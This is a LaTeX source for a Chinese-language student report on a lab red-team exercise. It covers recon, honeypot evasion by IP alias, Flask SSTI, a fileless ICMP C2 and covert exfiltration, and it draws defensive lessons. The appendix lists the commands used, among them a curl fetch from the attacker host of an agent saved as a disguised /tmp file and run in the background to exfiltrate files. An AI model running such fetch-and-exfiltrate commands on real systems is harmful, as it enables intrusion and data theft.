@@ -1,0 +1,452 @@
+% !TeX program = xelatex
+\documentclass[UTF8,11pt]{ctexart}
+
+\usepackage[a4paper,margin=2.2cm]{geometry}
+\usepackage{graphicx}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{float}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{subcaption}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=blue,
+  urlcolor=blue,
+  citecolor=blue
+}
+
+\lstset{
+  basicstyle=\ttfamily\small,
+  breaklines=true,
+  frame=single,
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false
+}
+
+\setlength{\parskip}{0.4em}
+\setlength{\parindent}{2em}
+
+% Overleaf-safe image helper:
+% If the images have not been uploaded yet, compilation still succeeds.
+\newcommand{\safeincludegraphics}[2]{%
+  \IfFileExists{#1}{%
+    \includegraphics[width=#2]{#1}%
+  }{%
+    \fbox{\parbox[c][0.26\textheight][c]{#2}{\centering Missing image\\\texttt{#1}}}%
+  }%
+}
+
+\title{Class Project -- Attack\\\large Group 6 Hands-on 1 書面報告}
+\author{M143040024\,陳品叡\\M143140012\,呂易鴻\\M143140017\,王承煜}
+\date{2026-04-29}
+
+\begin{document}
+\maketitle
+
+\begin{abstract}
+本報告整理 Group 6 於 2026-04-29 進行的實際攻防實驗結果。此次實驗聚焦於一條可驗證的核心攻擊鏈：從
+Reconnaissance、honeypot 觸發與 IP alias 繞過、Flask/Jinja2 SSTI 入口、fileless ICMP
+Command and Control，到 exfiltration agent 的下載與敏感資料外傳。藍隊端則提供靶機、
+honeypot 與 network MDR 作為防禦背景，讓我們能觀察單純 IP blocking 的效果與限制。
+本報告以實際執行指令與截圖證據為主，說明這次實驗做了什麼、證明了什麼，以及哪些部分
+仍有待後續更完整的防禦驗證。
+\end{abstract}
+
+\tableofcontents
+\newpage
+
+\section{Introduction}
+
+\subsection{Project context}
+本次書面報告對應課堂公告中的 ``Class Project -- Attack'' 報告要求，內容需包含 Hands-on 1
+的完整體、Kill Chain 流程、書面報告、簡報與 demo 影片。第六組本次專案以多層次攻防實驗室
+（target + honeypot + eBPF + C2 + exfiltration）
+展示 Cyber Kill Chain 與 MITRE ATT\&CK 的概念。
+
+\subsection{Why this report is evidence-driven}
+本報告聚焦於 2026-04-29 的實際實驗範圍，採用「證據導向」的寫法：只描述本次真的做過、
+真的觀察到、且能由畫面與結果互相印證的內容。換言之，本報告的重點不是理想化地展開所有可能
+回合，而是忠實呈現本次已完成的攻擊鏈與其防禦意義。
+
+\subsection{Objectives of this report}
+本報告有三個目的：
+\begin{enumerate}[leftmargin=*]
+  \item 說明本次實驗實際做了哪些步驟，以及每一步在攻擊鏈中的角色。
+  \item 以截圖和命令對照，證明這次實驗成功建立了從 Recon 到資料外傳的核心攻擊鏈。
+  \item 分析這次實驗對應的防禦意義：honeypot + network MDR 有效，但可被 IP alias 繞過；而本次並未完整驗證 eBPF v1/v2 的攔截回合。
+\end{enumerate}
+
+\subsection{Scope and ethics}
+所有活動均在隔離的 lab 環境內進行，靶機與脆弱服務皆為課程專案自行建置。實驗內容僅供
+授權教學與研究用途，不涉及對未授權系統的測試，也不包含 privilege escalation 或破壞性
+impact。
+
+\section{Background and Analytical Frame}
+
+\subsection{Cyber Kill Chain}
+Lockheed Martin 提出的 Cyber Kill Chain 將攻擊拆解為七個主要階段：
+Reconnaissance、Weaponization、Delivery、Exploitation、Installation、
+Command and Control、Actions on Objectives。本專案也以這條鏈作為整體分析主軸。
+
+本次 2026-04-29 實驗雖然沒有涵蓋所有可能的防禦互動情境，但依然驗證了其中最重要的一條主鏈：
+\[
+\text{Recon} \rightarrow
+\text{Honeypot Trigger} \rightarrow
+\text{IP Bypass} \rightarrow
+\text{SSTI} \rightarrow
+\text{Fileless C2} \rightarrow
+\text{Command Execution} \rightarrow
+\text{Exfiltration}
+\]
+
+\subsection{MITRE ATT\&CK}
+MITRE ATT\&CK 提供對真實攻擊技術的標準化描述。這次實驗可清楚對應到以下技術：
+\begin{itemize}[leftmargin=*]
+  \item T1595: Active Scanning
+  \item T1190: Exploit Public-Facing Application
+  \item T1620: Reflective Code Loading
+  \item T1059.006: Python Execution
+  \item T1095: Non-Application Layer Protocol
+  \item T1048.003: Exfiltration Over Alternative Protocol
+\end{itemize}
+
+\subsection{Position of this experiment in the project}
+就整個專案而言，這次實驗的重點在於驗證一條完整可觀測的主攻擊鏈：先由偵察辨識目標，再藉由
+應用層漏洞建立 fileless C2，最後完成資料外傳。相較之下，更進一步的防禦升級與對抗回合，
+則屬於專案的延伸驗證方向。
+
+\section{Environment and Experiment Scope}
+
+\subsection{Machines and roles}
+本次實驗使用兩台 Ubuntu 24.04 機器：
+\begin{itemize}[leftmargin=*]
+  \item Lab machine：提供 target、honeypot 與 blue team network MDR。
+  \item Attacker machine：執行 red team recon、C2、exfil listener 與外傳控制。
+\end{itemize}
+
+\subsection{Observed addressing}
+由截圖與命令順序可知：
+\begin{itemize}[leftmargin=*]
+  \item Target IP: \texttt{192.168.1.3}
+  \item Attacker source IP (first): \texttt{192.168.1.14}
+  \item Attacker alias IP (bypass): \texttt{192.168.1.15}
+\end{itemize}
+
+\subsection{Services actually involved in this experiment}
+\begin{table}[H]
+\centering
+\begin{tabular}{lll}
+\toprule
+Service & Port & Role in this run \\
+\midrule
+Fake SSH honeypot & 2222 & 誘捕/記錄可疑連線 \\
+Diagnostic Portal & 9999 & Flask SSTI 入口 \\
+ICMP C2 & ICMP & fileless agent 與控制通道 \\
+Exfil listener DNS & 53 & 接收 DNS 外傳 chunk \\
+Deploy HTTP server & 8888 & 提供 \texttt{exfil\_agent.py} 下載 \\
+\bottomrule
+\end{tabular}
+\caption{Services that were actually exercised on 2026-04-29}
+\end{table}
+
+\subsection{What was and was not executed}
+本次實驗\textbf{有做}：
+\begin{itemize}[leftmargin=*]
+  \item Recon
+  \item honeypot 觸發
+  \item IP alias bypass
+  \item SSTI 入口確認
+  \item fileless ICMP C2 建立
+  \item 基本 post-exploitation 指令
+  \item exfiltration agent 下載、背景執行與 loot 驗證
+\end{itemize}
+
+本次實驗\textbf{沒有完整做}：
+\begin{itemize}[leftmargin=*]
+  \item eBPF v1 啟動後清除既有威脅的完整回合
+  \item reverse shell bypass
+  \item eBPF v2 偵測 reverse shell 的完整回合
+  \item 更完整的多回合防禦升級驗證
+\end{itemize}
+
+\section{Actual Attack Chain Performed on 2026-04-29}
+
+本節依照本次實驗中實際執行的步驟，重建真正跑過的攻擊鏈。
+
+\begin{longtable}{>{\raggedright\arraybackslash}p{1.6cm} >{\raggedright\arraybackslash}p{5.0cm} >{\raggedright\arraybackslash}p{7.3cm}}
+\toprule
+Phase & Action & What it demonstrated \\
+\midrule
+Preparation & 藍隊啟動 \texttt{target\_app.py}、\texttt{honeypot.py}、\texttt{blue\_mdr\_network.py --cleanup} & 靶機、蜜罐與 network-level defense 均在線 \\
+Recon & \texttt{sudo bash red\_team/recon.sh 192.168.1.3} & 攻擊者可辨識出 2222 與 9999 兩個有價值的入口 \\
+Trap trigger & \texttt{nc -s 192.168.1.14 -v 192.168.1.3 2222} & 碰到假的 SSH 服務，證明 honeypot 會回 banner 並記錄來源 IP \\
+Bypass & \texttt{ip\_switch.sh add 192.168.1.15} & 單純 IP blocking 可被 attacker 更換來源 IP 繞過 \\
+Target validation & \texttt{curl --interface 192.168.1.15 http://192.168.1.3:9999/} & 攻擊者可從新 IP 成功存取真正目標頁面 \\
+Delivery & 啟動 \texttt{red\_attacker.py} 並輸入 \texttt{payload} 產生投遞字串 & 攻擊端準備 SSTI payload 與 ICMP C2 控制台 \\
+Exploitation & 將 payload 貼到另一個 terminal 執行 & 透過 SSTI 將 loader 注入靶機，啟動 fileless agent \\
+Installation + C2 & agent 回 beacon，C2 顯示 host / uid / kernel & 目標已在記憶體中執行 agent，並以 ICMP 回連 C2 \\
+Post-exploitation & \texttt{whoami}、\texttt{id}、\texttt{cat /etc/hostname}、\texttt{ls} & 取得互動控制，確認目標主機身份與檔案系統狀態 \\
+Exfiltration & 啟動 \texttt{exfil\_listener.py}，下載並背景執行 \texttt{exfil\_agent.py} & 敏感資料經 DNS/ICMP covert channel 傳回攻擊機 \\
+Verification & \texttt{ls -la loot/}、\texttt{cat loot/passwd | head -5} & 外傳結果已被成功重組並保存於攻擊機端 \\
+\bottomrule
+\end{longtable}
+
+\subsection{Interpretation}
+從攻擊鏈角度看，這次實驗最有價值的地方不是「每一回合都展示到了」，而是成功證明了一條
+從初始接觸到目標資料外流的連續路徑，而且每個步驟都有對應截圖可驗證。這讓報告能以
+``evidence-driven'' 的方式撰寫，而不是只引用設計文件描述理想流程。
+
+\section{Red Team Actions and Technical Meaning}
+
+\subsection{Reconnaissance}
+紅隊首先使用 \texttt{recon.sh} 掃描目標主機 \texttt{192.168.1.3}。這一步不是單純列出 port，
+而是在攻擊決策上分辨 ``看起來像高價值服務'' 的入口。對攻擊者來說，看到 \texttt{2222/tcp}
+像 SSH、\texttt{9999/tcp} 像自訂 Web service，就意味著一個可能是管理介面，一個可能是業務入口。
+
+\subsection{Triggering the honeypot on purpose}
+紅隊接著以 \texttt{nc} 從 \texttt{192.168.1.14} 主動連到 \texttt{192.168.1.3:2222}。
+這一步在戰術上不是為了真的拿 shell，而是為了驗證藍隊的 honeypot / MDR 機制是否上線。
+收到假 SSH banner 後，說明這個服務確實是設計來誤導與記錄攻擊者的。
+
+\subsection{Bypassing network-level blocking}
+在觸發 honeypot 之後，紅隊新增 alias IP \texttt{192.168.1.15}。這步說明 network-level defense
+雖然能針對單一來源 IP 做出反應，但並不能阻止攻擊者用同一台機器切換來源身份。
+因此，IP-based blocking 只能算是第一層摩擦，而不是完整阻擋。
+
+\subsection{Using SSTI as the real entry point}
+紅隊確認 \texttt{9999} 的 Diagnostic Portal 可存取後，啟動
+\texttt{red\_attacker.py}。這支工具會產生一條需貼到靶機端執行的 payload。
+這條 payload 的邏輯是：透過 Flask/Jinja2 的 SSTI 入口讓伺服器端執行 Python loader，
+再由 loader 透過 \texttt{memfd\_create} 在記憶體建立匿名 fd，將 agent code 寫入後直接執行。
+
+\subsection{Why the C2 is fileless}
+這裡的 fileless 並不是完全沒有任何程式碼存在，而是指 agent 並非以正常檔案形式長期落在
+磁碟上，而是寫入匿名記憶體 fd，再從 \texttt{/proc/<pid>/fd/<N>} 執行。這種模式減少了
+filesystem artefact，因此對傳統只看檔案落地的防禦來說更難察覺。
+
+\subsection{Interactive command execution}
+agent 回 beacon 後，紅隊在 C2 內執行 \texttt{whoami}、\texttt{id}、
+\texttt{cat /etc/hostname}、\texttt{ls}。這代表攻擊者不只成功植入 agent，而是已取得
+穩定的 command execution 通道，能做最基本的 post-exploitation 驗證。
+
+\subsection{Exfiltration deployment}
+最後，紅隊啟動 \texttt{exfil\_listener.py}，再讓靶機以 HTTP 下載 \texttt{exfil\_agent.py}
+到 \texttt{/tmp/.cache\_update.py}，並用 \texttt{nohup} 背景執行。這個 agent 會自動蒐集
+敏感資料並透過 DNS / ICMP 發回攻擊機，攻擊者端再將接收到的 chunk 重組成實際檔案。
+
+\section{Blue Team Context and What Was Validated}
+
+\subsection{Components that were active}
+雖然這次實驗的重點落在紅隊主鏈路，但藍隊端其實提供了重要背景條件：
+\begin{itemize}[leftmargin=*]
+  \item \texttt{target/target\_app.py}: 提供真正的 SSTI 攻擊面。
+  \item \texttt{target/honeypot.py}: 提供假 SSH 服務，將接觸行為轉成 \texttt{trap.log} 訊號。
+  \item \texttt{blue\_team/blue\_mdr\_network.py --cleanup}: 監看 \texttt{trap.log} 並對可疑 IP 插入 iptables DROP 規則。
+\end{itemize}
+
+\subsection{What this experiment proved about defense}
+這次實驗至少證明了兩件事：
+\begin{enumerate}[leftmargin=*]
+  \item 藍隊的 honeypot + network MDR 是有實際作用的，因為紅隊先碰到假 SSH，再切到新的來源 IP 繼續攻擊。
+  \item 單純封鎖來源 IP 並不足以阻止攻擊者完成後續入侵，因為攻擊者可以在同一張網卡上新增 IP alias。
+\end{enumerate}
+
+\subsection{What this experiment did not prove}
+本專案中還設計了更進一步的藍隊能力，例如 eBPF v1 偵測
+\texttt{memfd\_create + raw ICMP}、eBPF v2 偵測 \texttt{connect + dup2/dup3} 的 reverse shell
+行為。然而這些並沒有在本次截圖證據中完整出現，因此本報告只能將其描述為
+``專案中的下一層防禦''，而不能當成 2026-04-29 已完成驗證的結果。
+
+\subsection{Implication}
+從教學角度看，這樣的結果其實很有價值：因為它讓我們看到 defense-in-depth 的必要性。
+第一層網路封鎖雖然有效，但只能提高攻擊成本；如果沒有第二層針對行為的偵測，攻擊者仍可
+藉由改變來源 IP 繼續往後推進整條攻擊鏈。
+
+\section{Experimental Evidence and Results}
+
+本節將實驗截圖與實際指令對照，說明每張圖在整條攻擊鏈中的位置。
+
+\subsection{Figure-to-action mapping}
+\begin{longtable}{>{\raggedright\arraybackslash}p{2.0cm} >{\raggedright\arraybackslash}p{5.0cm} >{\raggedright\arraybackslash}p{6.9cm}}
+\toprule
+Figure & Command or state & Interpretation \\
+\midrule
+(1) & 啟用 \texttt{.venv} 並執行 \texttt{recon.sh} & 紅隊進入實驗環境並開始 Recon \\
+(2) & 新增來源 IP \texttt{192.168.1.14} & 準備以指定來源位址進行探測/觸發 honeypot \\
+(5) & \texttt{nc -s 192.168.1.14 -v 192.168.1.3 2222} & 取得假 SSH banner，觸發 honeypot 記錄 \\
+(6) & \texttt{ip\_switch.sh add 192.168.1.15} & 建立新的 alias IP，準備繞過封鎖 \\
+(7) & \texttt{curl --interface 192.168.1.15 http://192.168.1.3:9999/} & 驗證真正攻擊面可從新 IP 存取 \\
+(8) & 啟動 \texttt{red\_attacker.py} & 建立 ICMP C2 端並等待操作 \\
+(9) & C2 banner / menu & 攻擊端已準備好產生 payload 與接收 beacon \\
+(10) & 在 C2 輸入 \texttt{payload} & 要求系統生成 SSTI 投遞字串 \\
+(11) & 顯示長 payload 字串 & 可貼到另一個 terminal 執行的攻擊內容 \\
+(12) & payload 被貼到另一個 terminal 後的結果 & 靶機 agent 成功回 beacon，建立 C2 \\
+(13) & \texttt{whoami}, \texttt{id} & 確認命令執行通道有效且權限為 root \\
+(15) & \texttt{cat /etc/hostname}, \texttt{ls} & 進一步驗證主機身份與目錄內容 \\
+(16) & 啟動 \texttt{exfil\_listener.py} & 攻擊機開始監聽 DNS/ICMP 外傳流量 \\
+(17) & 下載並背景執行 \texttt{exfil\_agent.py} & 啟動資料外傳 agent；listener 同步收到 chunk \\
+(19) & \texttt{ls -la loot/} & 攻擊機端已生成重組後的 loot 檔案 \\
+(20) & \texttt{cat loot/passwd | head -5} & 驗證外傳資料內容來自靶機 \\
+\bottomrule
+\end{longtable}
+
+\subsection{Core evidence figures}
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (1).png}{\linewidth}
+\caption{Recon 啟動}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (5).png}{\linewidth}
+\caption{honeypot 觸發}
+\end{subfigure}
+\caption{前期階段：紅隊先做 Recon，接著故意觸發 honeypot。這兩張圖共同說明本次實驗一開始就把網路層欺敵與初始探測連在一起。}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (6).png}{\linewidth}
+\caption{IP alias bypass}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (7).png}{\linewidth}
+\caption{確認真正入口 9999}
+\end{subfigure}
+\caption{中期轉折：紅隊不是被 honeypot 阻斷，而是改用新的來源 IP 繞過封鎖，再繼續存取真實目標。}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (9).png}{\linewidth}
+\caption{ICMP C2 啟動}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (12).png}{\linewidth}
+\caption{agent beacon 回連}
+\end{subfigure}
+\caption{主要攻擊鏈：SSTI payload 被投遞之後，靶機端的 fileless agent 成功透過 ICMP 回連到攻擊機。}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (13).png}{\linewidth}
+\caption{whoami / id}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (15).png}{\linewidth}
+\caption{hostname / ls}
+\end{subfigure}
+\caption{互動控制證據：紅隊已能在靶機上執行基本 post-exploitation 指令。}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (17).png}{\linewidth}
+\caption{外傳 agent 啟動與 chunk 接收}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (20).png}{\linewidth}
+\caption{驗證 loot/passwd 內容}
+\end{subfigure}
+\caption{最終結果：攻擊者不只取得 C2，還成功把靶機資料透過 covert channel 傳回攻擊機並保存。}
+\end{figure}
+
+\subsection{What the evidence proves}
+這批證據能支持以下結論：
+\begin{enumerate}[leftmargin=*]
+  \item 紅隊確實成功從 Recon 進入到實際 exploitation。
+  \item honeypot 與 network MDR 的存在是真實的，因為紅隊有必要切換來源 IP。
+  \item SSTI payload 成功觸發 fileless agent，並建立 ICMP C2。
+  \item 紅隊不只拿到 beacon，而是拿到穩定可互動的命令執行能力。
+  \item 最後的資料外傳不是模擬輸出，而是有實際檔案落在攻擊機的 \texttt{loot/} 中。
+\end{enumerate}
+
+\section{Discussion}
+
+\subsection{What this experiment says about the project}
+如果把整個專案看成一個完整攻防框架，這次實驗的角色比較像是 ``核心攻擊鏈 proof-of-execution''。
+它證明專案中的幾個關鍵元件不是紙上設計，而是真的能串起來：target、honeypot、network MDR、
+red attacker、ICMP C2、exfil listener、exfil agent 都確實參與了同一次實驗。
+
+\subsection{Main security lessons}
+\begin{itemize}[leftmargin=*]
+  \item 第一個教訓是：honeypot 與 IP blocking 有用，但它們主要提供的是拖延與告警，而不是絕對阻斷。
+  \item 第二個教訓是：一旦真正的應用層漏洞仍然存在，攻擊者只要換一個來源身份，就能繼續往後推進。
+  \item 第三個教訓是：fileless execution 與 ICMP C2 讓攻擊痕跡更不依賴傳統檔案落地，因此需要更高層次的行為監控。
+  \item 第四個教訓是：exfiltration 才是整條攻擊鏈真正的終點；拿到 shell 只是中間狀態，能把資料帶走才代表攻擊成功。
+\end{itemize}
+
+\section{Conclusion}
+
+本次 2026-04-29 實驗已成功驗證專案中最關鍵的一條
+攻擊鏈：紅隊先透過 Recon 分辨假服務與真目標，再故意觸發 honeypot、以 IP alias 繞過網路封鎖，
+接著利用 Flask/Jinja2 SSTI 建立 fileless ICMP C2，最後下載並執行 exfil agent，把敏感資料外傳
+回攻擊機端。從截圖、命令與 loot 驗證可知，這條鏈路不是理論推演，而是一次實際完成的 hands-on
+攻擊流程。
+
+對第六組的專案而言，這次實驗最重要的價值在於：它證明核心構想具有可操作性，
+同時也清楚暴露了單純 network-layer defense 的限制。honeypot 與 network MDR 能有效製造摩擦與
+告警，但若缺少更深一層的行為偵測，攻擊者仍可藉由改變來源 IP 與利用應用層漏洞繼續推進。
+因此，本報告最合適的定位不是 ``完整七回合都跑完''，而是 ``以實證方式驗證專案核心攻擊鏈與
+第一層防禦限制''。
+
+\section{Appendix: Commands Actually Used}
+
+\subsection{Blue team startup}
+\begin{lstlisting}
+cd ~/cybersecurity
+bash setup_env.sh
+source .venv/bin/activate
+sudo .venv/bin/python3 target/target_app.py
+sudo .venv/bin/python3 target/honeypot.py
+sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup
+\end{lstlisting}
+
+\subsection{Red team sequence}
+\begin{lstlisting}
+source .venv/bin/activate
+sudo bash red_team/recon.sh 192.168.1.3
+sudo bash red_team/ip_switch.sh add 192.168.1.14
+nc -s 192.168.1.14 -v 192.168.1.3 2222
+bash red_team/ip_switch.sh add 192.168.1.15
+curl -s --interface 192.168.1.15 http://192.168.1.3:9999/
+sudo .venv/bin/python3 red_team/red_attacker.py -t 192.168.1.3 -l 192.168.1.15
+payload
+\end{lstlisting}
+
+\subsection{Commands issued after C2 beacon}
+\begin{lstlisting}
+whoami
+id
+cat /etc/hostname
+ls
+sudo .venv/bin/python3 red_team/exfil_listener.py
+curl -sS http://192.168.1.15:8888/exfil_agent.py -o /tmp/.cache_update.py
+nohup python3 /tmp/.cache_update.py 192.168.1.15 > /dev/null 2>&1 &
+ls -la loot/
+cat loot/passwd | head -5
+\end{lstlisting}
+
+\end{document}
